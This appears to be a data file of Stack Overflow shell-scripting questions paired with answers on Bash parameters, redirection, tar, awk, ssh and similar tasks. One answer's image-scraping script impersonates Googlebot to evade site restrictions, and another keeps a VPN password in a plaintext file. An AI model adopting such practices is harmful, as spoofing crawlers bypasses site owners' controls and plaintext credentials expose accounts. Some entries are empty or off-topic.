    "Delete positional parameters in Bash?": "The best way, if you want to be able to pass on the parameters to another process, or handle space separated parameters, is to re-set the parameters:\n$ x(){ echo \"Parameter count before: $#\"; set -- \"${@:1:2}\" \"${@:4:8}\"; echo \"$@\"; echo \"Parameter count after: $#\"; }\n$ x 1 2 3 4 5 6 7 8\nParameter count before: 8\n1 2 4 5 6 7 8\nParameter count after: 7\nTo test that it works with non-trivial parameters:\n$ x $'a\\n1' $'b\\b2' 'c 3' 'd 4' 'e 5' 'f 6' 'g 7' $'h\\t8'\nParameter count before: 8\na\n1 2 d 4 e 5 f 6 g 7 h   8\nParameter count after: 7\n(Yes, $'\\b' is a backspace)",
    "Executing commands containing space in Bash": "Try changing the one line to eval $cmds rather than just $cmds",
    "How does \"while (sleep 100 &!) do; done\" work in zsh, and how could it be replicated in bash?": "The reason that a fork-bomb works is because there is a finite limit to the number of processes that can be running at any one time, and a fork-bomb is designed to fill this limit.\nBecause the forkbomb code you provided dies if it cannot spawn a child process, the parent processes do not actually hang around, but the fact that the children keep creating new grand*-children keeps the process table full.\nSo the sleep solution is designed to sneak in some processes that just sleep for a short period of time, and for each sleep process that manages to be created, there are less fork-bombs happening. Eventually the sleep processes fill up the proces table themselves and the fork bombs die off.\nOnce the process table is full off sleep processes the while loop can be killed, and the sleep processes will die once their sleep time is up. Problem solved.\nAs has already been mentioned the important part of the zsh command is the run-in-background &, so the bash command would basically be the same as given in the other answers:\nwhile (sleep 100 &) do; done\nI don't think that the nohup/! part is important unless you want to log out within the sleep time, but I'd be happy to be set straight if I am wrong.",
    "Create a single tar file for multiple directories by excluding its parent folders": "If I understand right the question, you can use the -C (capital C = change directory) option, e.g:\ntar cvf /tmp/some.tar -C /path/to/dir1 . -C /path/to/dir2 .    #multiple -C allowed\ncheck it with\n tar cf - -C /path/to/dir1 . -C /path/to/dir2 .  | tar tvf -\nExample:\ncreateing a testcase\ncd /tmp\nmkdir test\ncd test\nmkdir -p {dir{1..3},testdir}\ntouch dir1/file{1..3} dir2/file{4..6} dir3/file{7..9}\nthe tree is now:\n$ find . -print\n.\n./dir1\n./dir1/file1\n./dir1/file2\n./dir1/file3\n./dir2\n./dir2/file4\n./dir2/file5\n./dir2/file6\n./dir3\n./dir3/file7\n./dir3/file8\n./dir3/file9\n./testdir\nThe tar:\ntar cf - -C dir1 . -C ../dir2 . -C ../dir3 . | tar tvf -\nthe tar content is:\ndrwxr-xr-x  0 jm    staff       0 14 aug 13:07 ./\n-rw-r--r--  0 jm    staff       0 14 aug 13:07 ./file1\n-rw-r--r--  0 jm    staff       0 14 aug 13:07 ./file2\n-rw-r--r--  0 jm    staff       0 14 aug 13:07 ./file3\ndrwxr-xr-x  0 jm    staff       0 14 aug 13:08 ./\n-rw-r--r--  0 jm    staff       0 14 aug 13:10 ./file4\n-rw-r--r--  0 jm    staff       0 14 aug 13:10 ./file5\n-rw-r--r--  0 jm    staff       0 14 aug 13:10 ./file6\ndrwxr-xr-x  0 jm    staff       0 14 aug 13:08 ./\n-rw-r--r--  0 jm    staff       0 14 aug 13:10 ./file7\n-rw-r--r--  0 jm    staff       0 14 aug 13:10 ./file8\n-rw-r--r--  0 jm    staff       0 14 aug 13:10 ./file9\nIf you want something other, please edit your question.",
    "How to enable the up/down arrow keys to show previous inputs when using `read`?": "Two solutions using the -e option to the read command combined with the builtin history command:\n# version 1\nwhile IFS=\"\" read -r -e -d $'\\n' -p 'input> ' line; do \n   echo \"$line\"\n   history -s \"$line\"\ndone\n\n# version 2\nwhile IFS=\"\" read -r -e -d $'\\n' -p 'input> ' line; do \n   echo \"$line\"\n   echo \"$line\" >> ~/.bash_history\n   history -n\ndone",
    "Why doesn't my variable seem to increment in my bash while loop?": "This is because you are using the useless cat command with a pipe, causing a subshell to be created. Try it without the cat:\nwhile read filename ; do\n    N=$((N+1))\n    ....\ndone < file",
    "Is there for the bash something like perls __DATA__?": "Shell scripts are parsed on a line-by-line basis as they execute, so you just need to ensure execution never reaches the data you want to protect. You could do this, for instance:\n# Some shell code...\n\nexit\n\n[data (possibly binary) goes here]\nTo actually read this data from your script, you can use some sed magic to extract everything after the first line containing only __DATA__, then store the output of that sed in a variable. Here's an example:\n#!/bin/sh\n\ndata=$(sed '0,/^__DATA__$/d' \"$0\")\nprintf '%s\\n' \"$data\"\n\nexit\n\n__DATA__\nFOO BAR BAZ\nLLAMA DUCK COW\nIf you save this script as test-data.sh and make it executable, you can run it and get the following output:\n$ ./test-data.sh\nFOO BAR BAZ\nLLAMA DUCK COW",
    "Test postgresql connection string using psql at bash command line?": "Run this instead:\npsql \"$my_conn\" -c \"SELECT 1\"\nThis would try to execute a simple query that always should return a one-row result and then exit. Also you could check the exit code of the operation by calling:\necho $?\nAnything different than 0 would mean some error.",
    "List files that contain `n` or fewer lines": "With GNU awk for nextfile and ENDFILE:\nawk -v n=27 'FNR>n{f=1; nextfile} ENDFILE{if (!f) print FILENAME; f=0}' *.txt\nWith any awk:\nawk -v n=27 '\n    { fnrs[FILENAME] = FNR }\n    END {\n        for (i=1; i<ARGC; i++) {\n            filename = ARGV[i]\n            if ( fnrs[filename] < n ) {\n                print filename\n            }\n        }\n    }\n' *.txt\nThose will both work whether the input files are empty or not. The caveats for the non-gawk version are the same as for your other current awk answers:\nIt relies on the same file name not appearing multiple times (e.g. awk 'script' foo bar foo) and you wanting it displayed multiple times, and\nIt relies on there being no variables set in the arg list (e.g. awk 'script' foo FS=, bar)\nThe gawk version has no such restrictions.\nUPDATE:\nTo test the timing between the above GNU awk script and the GNU grep+sed script posted by xhienne since she stated that her solution would be faster than a pure awk script I created 10,000 input files, all of 0 to 1000 lines in length by using this script:\n$ awk -v numFiles=10000 -v maxLines=1000 'BEGIN{for (i=1;i<=numFiles;i++) {numLines=int(rand()*(maxLines+1)); out=\"out_\"i\".txt\"; printf \"\" > out; for (j=1;j<=numLines; j++) print (\"foo\" j) > out} }'\nand then ran the 2 commands on them and got these 3rd run timing results:\n$ time grep -c -m28 -H ^ *.txt | sed '/:28$/ d; s/:[^:]*$//' > out.grepsed\n\nreal    0m1.326s\nuser    0m0.249s\nsys     0m0.654s\n\n$ time awk -v n=27 'FNR>n{f=1; nextfile} ENDFILE{if (!f) print FILENAME; f=0}' *.txt > out.awk\n\nreal    0m1.092s\nuser    0m0.343s\nsys     0m0.748s\nBoth scripts produced the same output files. The above was run in bash on cygwin. I expect on different systems the timing results might vary a little but the difference will always be negligible.\nTo print 10 lines of up to 20 random chars per line (see the comments):\n$ maxChars=20\n    LC_ALL=C tr -dc '[:print:]' </dev/urandom |\n    fold -w \"$maxChars\" |\n    awk -v maxChars=\"$maxChars\" -v numLines=10 '\n        { print substr($0,1,rand()*(maxChars+1)) }\n        NR==numLines { exit }\n    '\n0J)-8MzO2V\\XA/o'qJH\n@r5|g<WOP780\n^O@bM\\\nvP{l^pgKUFH9\n-6r&]/-6dl}pp W\n&.UnTYLoi['2CEtB\nY~wrM3>4{\n^F1mc9\n?~NHh}a-EEV=O1!y\nof\nTo do it all within awk (which will be much slower):\n$ cat tst.awk\nBEGIN {\n    for (i=32; i<127; i++) {\n        chars[++charsSize] = sprintf(\"%c\",i)\n    }\n    minChars = 1\n    maxChars = 20\n    srand()\n    for (lineNr=1; lineNr<=10; lineNr++) {\n        numChars = int(minChars + rand() * (maxChars - minChars + 1))\n        str = \"\"\n        for (charNr=1; charNr<=numChars; charNr++) {\n            charsIdx = int(1 + rand() * charsSize)\n            str = str chars[charsIdx]\n        }\n        print str\n    }\n}\n\n$ awk -f tst.awk\nHeer H{QQ?qHDv|\nPsuq\nEy`-:O2v7[]|N^EJ0\nj#@/y>CJ3:=3*b-joG:\n?\n^|O.[tYlmDo\nTjLw\n`2Rs=\n!('IC\nhui",
    "Pass groovy variable to shell script": "",
    "Move file as root preserving ownership linux [closed]": "rsync :\n -A, --acls                  preserve ACLs (implies --perms)\n -X, --xattrs                preserve extended attributes\n -o, --owner                 preserve owner (super-user only)\n -g, --group                 preserve group\n     --devices               preserve device files (super-user only)\n     --specials              preserve special files\nman rsync",
    "how to silently disable xtrace in a shell script?": "Sandbox it in a subshell:\n(set -x; do_thing_you_want_traced)\nOf course, changes to variables or the environment made in that subshell will be lost.\nIf you REALLY care about this, you could also use a DEBUG trap (using set -T to cause it to be inherited by functions) to implement your own set -x equivalent.\nFor instance, if using bash:\ntrap_fn() {\n  [[ $DEBUG && $BASH_COMMAND != \"unset DEBUG\" ]] && \\\n    printf \"[%s:%s] %s\\n\" \"$BASH_SOURCE\" \"$LINENO\" \"$BASH_COMMAND\"\n  return 0 # do not block execution in extdebug mode\n}\ntrap trap_fn DEBUG\n\nDEBUG=1\n# ...do something you want traced...\nunset DEBUG\nThat said, emitting BASH_COMMAND (as a DEBUG trap can do) is not fully equivalent of set -x; for instance, it does not show post-expansion values.",
    "Download first 1000 images from google search": "update 4: PhantomJS is now obsolete, I made a new script google-images.py in Python using Selenium and Chrome headless. See here for more details: https://stackoverflow.com/a/61982397/218294\nupdate 3: I fixed the script to work with phantomjs 2.x.\nupdate 2: I modified the script to use phantomjs. It's harder to install, but at least it works again. http://sam.nipl.net/b/google-images http://sam.nipl.net/b/google-images.js\nupdate 1: Unfortunately this no longer works. It seems Javascript and other magic is now required to find where the images are located. Here is a version of the script for yahoo image search: http://sam.nipl.net/code/nipl-tools/bin/yimg\noriginal answer: I hacked something together for this. I normally write smaller tools and use them together, but you asked for one shell script, not three dozen. This is deliberately dense code.\nhttp://sam.nipl.net/code/nipl-tools/bin/google-images\nIt seems to work very well so far. Please let me know if you can improve it, or suggest any better coding techniques (given that it's a shell script).\n#!/bin/bash\n[ $# = 0 ] && { prog=`basename \"$0\"`;\necho >&2 \"usage: $prog query count parallel safe opts timeout tries agent1 agent2\ne.g. : $prog ostrich\n       $prog nipl 100 20 on isz:l,itp:clipart 5 10\"; exit 2; }\nquery=$1 count=${2:-20} parallel=${3:-10} safe=$4 opts=$5 timeout=${6:-10} tries=${7:-2}\nagent1=${8:-Mozilla/5.0} agent2=${9:-Googlebot-Image/1.0}\nquery_esc=`perl -e 'use URI::Escape; print uri_escape($ARGV[0]);' \"$query\"`\ndir=`echo \"$query_esc\" | sed 's/%20/-/g'`; mkdir \"$dir\" || exit 2; cd \"$dir\"\nurl=\"http://www.google.com/search?tbm=isch&safe=$safe&tbs=$opts&q=$query_esc\" procs=0\necho >.URL \"$url\" ; for A; do echo >>.args \"$A\"; done\nhtmlsplit() { tr '\\n\\r \\t' ' ' | sed 's/</\\n</g; s/>/>\\n/g; s/\\n *\\n/\\n/g; s/^ *\\n//; s/ $//;'; }\nfor start in `seq 0 20 $[$count-1]`; do\nwget -U\"$agent1\" -T\"$timeout\" --tries=\"$tries\" -O- \"$url&start=$start\" | htmlsplit\ndone | perl -ne 'use HTML::Entities; /^<a .*?href=\"(.*?)\"/ and print decode_entities($1), \"\\n\";' | grep '/imgres?' |\nperl -ne 'use URI::Escape; ($img, $ref) = map { uri_unescape($_) } /imgurl=(.*?)&imgrefurl=(.*?)&/;\n$ext = $img; for ($ext) { s,.*[/.],,; s/[^a-z0-9].*//i; $_ ||= \"img\"; }\n$save = sprintf(\"%04d.$ext\", ++$i); print join(\"\\t\", $save, $img, $ref), \"\\n\";' |\ntee -a .images.tsv |\nwhile IFS=$'\\t' read -r save img ref; do\nwget -U\"$agent2\" -T\"$timeout\" --tries=\"$tries\" --referer=\"$ref\" -O \"$save\" \"$img\" || rm \"$save\" &\nprocs=$[$procs + 1]; [ $procs = $parallel ] && { wait; procs=0; }\ndone ; wait\nFeatures:\nunder 1500 bytes\nexplains usage, if run with no args\ndownloads full images in parallel\nsafe search option\nimage size, type, etc. opts string\ntimeout / retries options\nimpersonates googlebot to fetch all images\nnumbers image files\nsaves metadata\nI'll post a modular version some time, to show that it can be done quite nicely with a set of shell scripts and simple tools.",
    "How to replace space with \\(space) using sed?": "Add another \\ i.e. you need to make \\ literal:\nsed 's/ /\\\\ /g'\nWith only a single \\ before space, the \\ is escaping the following space; as the space is not a special character in replacement that needs escaping, it is being taken as is.\nExample:\n% sed 's/ /\\\\ /g' <<<'foo  bar  spam'\nfoo\\ \\ bar\\ \\ spam",
    "grep double quotes vs single quotes": "The difference between single quotes and double quotes is a shell issue, not a grep issue. It is the shell that decides to do or not to do variable expansion before passing the arguments to grep. Because the last step in shell processing of arguments is quote removal, grep never even sees the quotes.\nVariable expansion is not the only difference between single and double quotes. The shell also does command substitution and arithmetic expansion inside double quotes. For example:\n$ echo \"$(date) and 2+2=$((2+2))\"\nTue Aug  5 18:52:39 PDT 2014 and 2+2=4\n$ echo '$(date) and 2+2=$((2+2))'\n$(date) and 2+2=$((2+2))",
    "New-Item recursive registry keys": "I was just missing the -force parameter\nNew-Item hklm:software/classes/firefoxhtml/shell/edit/command -Force\nUsing -Force will also remove everything under the key if it already exists so a better option would be\nif(!(Test-Path $path)){\n    New-Item $path -Force;\n}",
    "How to substitute quoted, multi-word strings as arguments?": "Don't use quotes, use an array (see BashFAQ #050):\n$ myArgs=(\"hello\" \"world\" \"multiword arg with * ?\")\n+ myArgs=(\"hello\" \"world\" \"multiword arg with * ?\")\n$ echo \"${myArgs[@]}\"\n+ echo hello world 'multiword arg with * ?'\nhello world multiword arg with * ?\nIf it really needs to be in the form of quoted strings within a string, you're either going to have to use something like eval \"echo $myArg\" (which can cause some really nasty bugs, if you aren't careful) or parse it yourself (which is going to be difficult).",
    "How do I use a variable argument number in a bash script?": "from the bash man page:\n  shift [n]\n          The  positional  parameters  from n+1 ... are renamed to $1 ....\n          Parameters represented by the numbers  $#  down  to  $#-n+1  are\n          unset.   n  must  be a non-negative number less than or equal to\n          $#.  If n is 0, no parameters are changed.  If n is  not  given,\n          it  is assumed to be 1.  If n is greater than $#, the positional\n          parameters are not changed.  The return status is  greater  than\n          zero if n is greater than $# or less than zero; otherwise 0.\nSo your loop is going to look something like this:\n#loop through additional filetypes and append\nwhile [ $# -gt 0 ]\ndo\n  types=$types' -o -name *.'$1\n  shift\ndone",
    "Get parent directory of shell script's directory [duplicate]": "Run dirname twice (nested).\n~$ dirname $PWD\n/home\n~$ dirname `dirname $PWD`\n/\n~$ ",
    "Shell commands are written in what language?": "Most of the basic utilities in linux are written in C .This u can verify in busybox source code which supports most of basic linux command utility which are written in C. So command like ls,cd ...etc are in c\nHow shell will interpret check in below link\nin an operating system there is a special program called the shell. The shell accepts human readable commands and translates them into something the kernel can read and process.\nhttp://www.math.iitb.ac.in/resources/manuals/Unix_Unleashed/Vol_1/ch08.htm",
    "PowerShell equivalent of BASH (etc) 'type' command?": "An equivalent is Get-Command.\nPS C:\\> Get-Command ls\n\nCommandType     Name       Definition\n-----------     ----       ----------\nAlias           ls         Get-ChildItem\nApplication     ls.exe     D:\\usr\\local\\wbin\\ls.exe\nApplication     ls.exe     C:\\Program Files (x86)\\Git\\bin\\ls.exe\nWindows 10 Update:\nSince I've posted this answer, it appears that the behavior of Get-Command has changed. To include all results (in the style of Un*x) type), now I need to pass the -All flag, like so:\nPS C:\\> Get-Command -All ls\n\nCommandType     Name                 Version    Source\n-----------     ----                 -------    ------\nAlias           ls -> Get-ChildItem\nApplication     ls.exe               0.0.0.0    C:\\Program Files (x86)\\Git\\usr\\bin\\ls.exe\nAs noted in a comment, this doesn't include the Definition column as was the previous behavior. I can't determine a command-line argument to add the definition column, but as noted by @voutasaurus in the comment below, one can use:\nPS C:\\> (Get-Command -All ls).Definition\nGet-ChildItem\nC:\\Program Files (x86)\\Git\\usr\\bin\\ls.exe\nVersion information for reference (I odn't have the version information associated with the original answer text, but I'm guessing that it was Windows 7):\nPS C:\\> [System.Environment]::OSVersion.Version\n\nMajor  Minor  Build  Revision\n-----  -----  -----  --------\n10     0      15063  0",
    "What's difference between \"2>1 > /dev/null\" and \"2>&1 >/dev/null\"?": "The & means file descriptor1. So 2>&1 redirects standard error to whatever standard output currently points at, while 2>1 redirects standard error into a file called 1.\nAlso, the redirects happen in order. So if you say 2>&1 >/dev/null, it redirects standard error to point at what standard output currently points at (which is probably a noop), then redirects stdout to /dev/null. You probably want >/dev/null 2>&1.\n1In the context of a file redirect -- when it is the next token immediately after a > or <. In other contexts it means something else.",
    "Behaviour of GNU sort command (with non-letter ASCII characters, such as dot or semicolon)": "Force collation to C in order to compare the raw character values.\n$ echo -e 'TEST.b\\nTESTa\\nTESTc' | LC_COLLATE=C sort\nTEST.b\nTESTa\nTESTc",
    "how to use ctrl-D in a shell script": "You could try exec <&-\n&- is used to close a file descriptor (ps:everything in linux is a kind of file...)\n<&- is closing file descriptor 0 = stdin - can also be written as 0<&-\nIf you open a normal terminal in your linux machine and type exec <&- you will see your terminal to close/dissapear like if you press ^D.\nPS1: Similarly, exec >&- closes stdout\nPS2: If you close stdin with exec <&- you can re-open to continue your script with something like exec </dev/tty",
    "Sending keyboard input to a program from command-line": "xdotool does have a way of sending keystrokes if limited to a focused window:\nWID=`xdotool search \"Mozilla Firefox\" | head -1`\nxdotool windowactivate $WID\nxdotool key ctrl+l",
    "How to include bash scripts with relative path? [duplicate]": "You can specify the directory of the script itself. By default a single dot means \"current working directory\".\nScript B, modified version:\nsource \"$(dirname \"$0\")/A.sh\"\nSame mod recommended for C:\nsource \"$(dirname \"$0\")/libs/B.sh\"\nYou can alternatively use ${0%/*} for the same effect as $(dirname \"$0\")\nOr, to make sure it's the full path to the script, use ${BASH_SOURCE[0]}:\nScript B, modified:\nsource \"$(dirname \"${BASH_SOURCE[0]}\")/A.sh\"",
    "Unix: What does cat by itself do?": "cat will catenate its input to its output.\nIn the context of the variable capture you posted, the effect is to assign the statement's (or containing script's) standard input to the variable.\nThe command substitution $(command) will return the command's output; the assignment will assign the substituted string to the variable; and in the absence of a file name argument, cat will read and print standard input.\nThe Git hook script you found this in captures the commit data from standard input so that it can be repeatedly piped to each hook script separately. You only get one copy of standard input, so if you need it multiple times, you need to capture it somehow. (I would use a temporary file, and quote all file name variables properly; but keeping the data in a variable is certainly okay, especially if you only expect fairly small amounts of input.)",
    "Error running Shell object / commands through Excel VBA": "The error does come from the directory having a space in it:\nC:\\Users\\myname\\this is my folder\\myexe.exe\nA simple workaround does the trick:\nwsh.Run(Chr(34) & YourFullPathDirectoryWithSpaces & \"\\myexe.exe\" & Chr(34))\nChr(34) is a double quote.\nThere was an issue with .Run taking a two line property.\nTested it on Excel 2010/Win32.",
    "Why does process substitution not work in a shell script?": "It isn't entirely clear yet, but the chances are very high that you either have an incorrect shebang line at the top of the script:\n#!/bin/sh\nor you are using sh script.sh instead of bash script.sh while testing it, or you have SHELL=/bin/sh or something similar set in the environment. Your failure is on the process substitution code. When Bash is run as sh (in POSIX mode), then process substitution is not available:\nProcess substitution is not available.\nYou need to write:\n#!/bin/bash\n\ntemp=$(comm -12 <(sort -u /home/xyz/a.csv1) <(sort -u /home/abc/tempfile) | wc -l)\necho $temp\nor even simply:\n#!/bin/bash\n\ncomm -12 <(sort -u /home/xyz/a.csv1) <(sort -u /home/abc/tempfile) | wc -l\nwhich will achieve the same effect as the capture followed by the echo. When testing, use bash -x script.sh or bash script.sh.\nDeciphering the indecipherable comment\nIn an indecipherable comment, the information appears to include:\nBASH=/bin/sh\nBASHOPTS=cmdhist:extquote:force_fignore:hostcomplete:interactive_comments:progco\u200cmp:promptvars:sourcepath\nBASH_ALIASES=()\nBASH_ARGC=()\nBASH_ARGV=()\nBASH_CMDS=()\nBASH_LINENO=([0]=\"0\")\nBASH_SOURCE=([0]=\"a.sh\")\nBASH_VERSINFO=([0]=\"4\" [1]=\"1\" [2]=\"2\" [3]=\"1\" [4]=\"release\" [5]=\"x86_64-redhat-linux-gnu\")\nBASH_VERSION='4.1.2(1)-release'\nCVS_RSH=ssh\nSHELL=/bin/bash\nSHELLOPTS=braceexpand:hashall:interactive-comments:posix\nSHLVL=2\nNote that BASH=/bin/sh and SHELLOPTS=braceexpand:hashall:interactive-comments:posix. Either or both of these might be a major part of the problem.",
    "Creation of .ebextensions folder in aws elastic beanstalk": "",
    "Linux /bin/sh check if string contains X": "You can use a case statement:\ncase \"$myvar\" in\n*string*) echo yes ;;\n*       ) echo no ;;\nesac\nAll you have to do is substitute string for whatever you need.\nFor example:\ncase \"HELLOHELLOHELLO\" in\n*HELLO* ) echo \"Greetings!\" ;;\nesac\nOr, to put it another way:\nstring=\"HELLOHELLOHELLO\"\nword=\"HELLO\"\ncase \"$string\" in\n*$word*) echo \"Match!\" ;;\n*      ) echo \"No match\" ;;\nesac\nOf course, you must be aware that $word should not contain magic glob characters unless you intend glob matching.",
    "SSH to server, Sudo su - then run commands in bash [duplicate]": "Try\nssh -t $USER@server006.web.com 'sudo -u http grep -i \"Exception:\" /opt/local/server/logs/exceptions.log | grep -e \"|*-*-*:*:*,*|\" | tail -1 | awk -F\"|\" \"{print $2}\" >> log.log'\nSudo already runs the command as a different user to there's no need to su again.\nOnly reason to do sudo su is to have a fast way to start a new shell with another user.",
    "Customize colors for __git_ps1 with GIT_PS1_SHOWCOLORHINTS": "The colours shown by __git_ps1 for dirty branches don't affect the branch name; they affect the \"dirty state indicator\". In addition to enabling colours, if you enable this indicator you will see a red asterisk for a dirty branch:\nold-prompt $ bash --noprofile --norc\nbash-4.2$ source /etc/bash_completion.d/git-prompt\nbash-4.2$ export GIT_PS1_SHOWCOLORHINTS=1\nbash-4.2$ export GIT_PS1_SHOWDIRTYSTATE=1\nbash-4.2$ export PROMPT_COMMAND='__git_ps1 \"\\u@\\h:\\w\" \"\\\\\\$ \"'\nchris@machine:~/path/to/dir (master *)$\nThere is no way to change the colour of the branch name based on dirty status without modifying the git-prompt.sh code, or providing your own function.\nNote that this works with export PROMPT_COMMAND but not export PS1.",
    "How can I go back to the previous working directory after changing it?": "You're looking to change the working directory? The OS module in python has a lot of functions to help with this.\nimport os\nos.chdir( path )\npath being \"..\" to go up one directory. If you need to check where you are before/after a change of directory you can issue the getcwd() command:\nmycwd = os.getcwd()\nos.chdir(\"..\")\n#do stuff in parent directory\nos.chdir(mycwd)     # go back where you came from",
    "A simple if/else bash script which reacts to user's yes/no input? [duplicate]": "Use the read builtin to get input from the user.\nread -p \"Run command $foo? [yn]\" answer\nif [[ $answer = y ]] ; then\n  # run the command\nfi\nPut the above into a function that takes the command (and possibly the prompt) as an argument if you're going to do that multiple times.",
    "Grep ignore multiple lines": "Try awk:\nawk -v nlines=2 '/^Exception/ {for (i=0; i<nlines; i++) {getline}; next} 1'",
    "Pipe git diff to git apply": "This works for me (git 2.6.3):\ngit diff | git -C /other/location apply\nFrom man git:\n-C <path>\n       Run as if git was started in <path> instead of the current working\n       directory. When multiple -C options are given, each subsequent \n       non-absolute -C <path> is interpreted relative to\n       the preceding -C <path>.",
    "c# execute shell command and get result [duplicate]": "try this\nstring output = proc.StandardOutput.ReadToEnd();",
    "Why diff with ignore matching lines doesn't work as expected?": "This behaviour is normal given the way diff works (as of April 2013).\ndiff is line oriented, it means that a line is either considered totally different or totally equivalent. When a line is ignored, it is entered into the list of different lines before comparison, and when the change script is computed, changes made only of ignored lines are considered themselves as ignored. When ignored lines are adjacent to changed lines, it makes up a single non-ignored change.\nThe problem lies in the inability of diff to understand that consecutive lines are not related: you are not diffing a sequence of text (what diff is aimed at), but rather a list of independent lines which are keyed (Tab >= <key>). These problems seem pretty similar when both files are generated in the same order, but still not the same.",
    "Registering custom shell function in system (OSX)": "Just added it to the bottom of your ~/.bashrc file then you will be able to use cmit like a regular command, you will need to refresh your current shell to pick up the changes so run source ~/.bashrc. If you have the function saved in a file cmit just do cat cmit >> ~/.bashrc to append the function to the end of your ~/.bashrc.\nYou could try out a test function first:\n# add to ~/.bashrc first\nfunction test() {\n    echo \"Some test foo!\"\n}\n\n$ source ~/.bashrc\n\n$ test\nSome test foo!",
    "Adjusting shell mode color schemes": "When a program run inside shell-mode issues ANSI escape characters to set the display color to, say, magenta, Emacs intercepts those escape characters and creates a colored overlay using that exact foreground color \"magenta\". So there's no color theme interaction going on here, and no shell-specific customizations to look for.\nThe interception is made by the functions in ansi-color.el, though, and it looks like you could customize ansi-color-names-vector, so to use \"PaleBlue\" for \"blue\", either M-x customize RET ansi-color-names-vector, or try putting something like the following in your emacs config:\n(setq ansi-color-names-vector\n  [\"black\" \"red\" \"green\" \"yellow\" \"PaleBlue\" \"magenta\" \"cyan\" \"white\"])\nTo see available color names, use M-x list-colors-display, or enter hex colors instead, e.g. \"#ccccff\".",
    "Running bash function in command of su": "You can export the function to make it available to the subshell:\nexport -f my_function\nsu username -c \"my_function\"",
    "Display socket options [closed]": "You can use lsof(8). If PID is the process ID and FD is the file descriptor number of the socket you're interested in, you can do this:\nlsof -a -p PID -d FD -T f\nTo list all IPv4 sockets of a process:\nlsof -a -p PID -i 4 -T f\nThis will print out the socket options with a SO=, among other information. Note that if no options are set, you'll get the empty string, so you'll see something like SO=PQLEN=0 etc. To test for SO_BROADCAST, just grep for the string SO_BROADCAST after the SO=, e.g.\nif lsof -a -p PID -d FD -T f | grep -q 'SO=[^=]*SO_BROADCAST'; then\n    # socket has SO_BROADCAST\nelse\n    # it doesn't\nfi",
    "GitHub Actions workflow error: Run Command Timeout! Even if the script did well": "",
    "How to turn off echo while executing a shell script Linux [duplicate]": "No, it isn't possible.\n$x &> /dev/null",
    "Does head consume additional characters from stdin?": "Input and output are completely different beasts. The manual of head tell you what is the expected output, but it doesn't tell you anything about how the input is processed.\nSo the short answer is: you're relying on undocumented things.\nNow, if you are interested to know what's going behind the scenes, you can add some tracing\n| ( strace head -n 1; tail )\nin your 2nd example: Note: sorry for the strace format, I'm on cygwin at the moment.:\n[...]\n 24   35374 [main] head 1784 read: 51 = read(0, 0x22C700, 1024)\nthe first head process is trying to read the input, by reading a big chunk(1024 bytes), then probably looking for a newline character in the buffer. At least, that's how I would implement it. As you can see, it processed all 51 characters, so there's nothing left for the next process.\nin your 1st example: the main difference here is that we have an endless input, so even though the first head will read a big chunk, there's also input left for the second process. The boundary will be arbitrary, it depends on the chunk size, implementation of head, how fread (buffered IO) is implemented an so on. For example, on my system, this was the output:\n123456789\n56789",
    "Proper mime-type of shell scripts in subversion": "The file utility uses `text/x-shellscript' for shell scripts:\n$ file --mime-type /tmp/test.sh\n/tmp/test.sh: text/x-shellscript",
    "Feeding input to an interactive command line application": "you need to create an usual text file like\nconnect myvpnhost\nmyloginname\nmypassword\nsave it as myfile.dat (for example) and then call\n\"%ProgramFiles%\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpncli.exe\" -s < myfile.dat",
    "ssh with command....Plus the shell": "Variation on the other answers really, use the -t option of ssh to force pseudo-tty allocation:\nssh -t me@machine ./executeMyScript '&&' bash -i",
    "SSH - a way to transfer files without opening a separate SFTP session?": "You could set up such an inverted transfer connection w/\nssh -Rport:127.0.0.1:22 user@host\nfor scp back.\nUse scp user@host:port to access it.",
    "How can I reset a Django test database id's after each test?": "I got this to work by replacing TestCase with TransactionTestCase and set reset_sequences=True. However the tests are running slower.\nfrom django.test import TransactionTestCase\n\nclass ViewTest(TransactionTestCase):\n    reset_sequences = True\n\n    def test_view_redirects(self):\n       ...\nHere's the doc",
    "SSH : Remotely run a script and stay there": "Try this:\nssh -t user@remote 'logs.sh; bash -l'\nThe quotes are needed to pass both commands to ssh. The -t option forces a pseudo-tty allocation.\nDiscussion\nConsider:\nssh user@remote logs.sh;bash -l\nWhen the shell parses this line, it splits it into two commands. The first is:\nssh user@remote logs.sh\nThis runs logs.sh on the remote machine. The second command is:\nbash -l\nThis opens a login shell on the local machine.\nThe quotes were added above to prevent the shell from splitting up the commands this way.",
    "zip command not working": "zip warning: name not matched: myfile.dat\nThis means the file myfile.dat does not exist.\nYou will get the same error if the file is a symlink pointing to a non-existent file.\nAs you say, whatever is the last file at the of $FILES, it will not be added to the zip along with the warning. So I think something's wrong with the way you create $FILES. Chances are there is a newline, carriage return, space, tab, or other invisible character at the end of the last filename, resulting in something that doesn't exist. Try this for example:\nfor f in $FILES; do echo :$f:; done\nI bet the last line will be incorrect, for example:\n:myfile.dat :\n...or something like that instead of :myfile.dat: with no characters before the last :\nUPDATE\nIf you say the script started working after running dos2unix on it, that confirms what everybody suspected already, that somehow there was a carriage-return at the end of your $FILES list.\nod -c shows the \\r carriage-return. Try echo $FILES | od -c",
    "Posting a download to bitbucket from a shell script": "I made one which I use to post nightly builds from my buildbot.\nIt's available for both Bash and Batch, works fine so far.\nYou can find it here, it's well commented and requires cURL and grep:\nhttps://bitbucket.org/Swyter/bitbucket-curl-upload-to-repo-downloads\nGood: Barebones, just 46 LOC, with CSRF handling.\nBad: Doesn't check for captcha or success, you can easily do that yourself parsing the page if you need it.",
    "Installed Google Cloud SDK but can't access gcloud": "",
    "Capturing output and exit codes in BASH / SHELL": "It's possible to capture the segfault error message, but you really need to work at it.\nHere's one way:\noutputA=$(bash -c '(./a)' 2>&1)\nHere we create an child shell (with bash -c) whose stderr is redirected to stdout, and then get that child to execute the program in an explicit subshell. Errors inside the subshell will be captured by the child bash, which will then generate an error message (which is not quite the same as the message produced by an interactive bash):\n$ echo $outputA\nbash: line 1: 11636 Segmentation fault (core dumped) ( ./a )",
    "Why do bash command line arguments after 9 require curly brackets?": "Specifically, your question relates to \"positional parameters.\" Using $var instead of ${var} is shorthand in bash. In most cases it works well. Bash variables must start with a letter or underscore. It internally treats variables that start with a digit as a \"positional parameter.\" When bash detects a positional parameter it only looks at the first digit, which is why $10 returns $1\"0\". By calling ${10} you are instructing bash to look at the complete variable instead of its built-in default of the first digit.\nAs to why it is this way? I have no idea. Legacy implementation which has been expanded upon is my guess. \"Who would ever need more than....?\"",
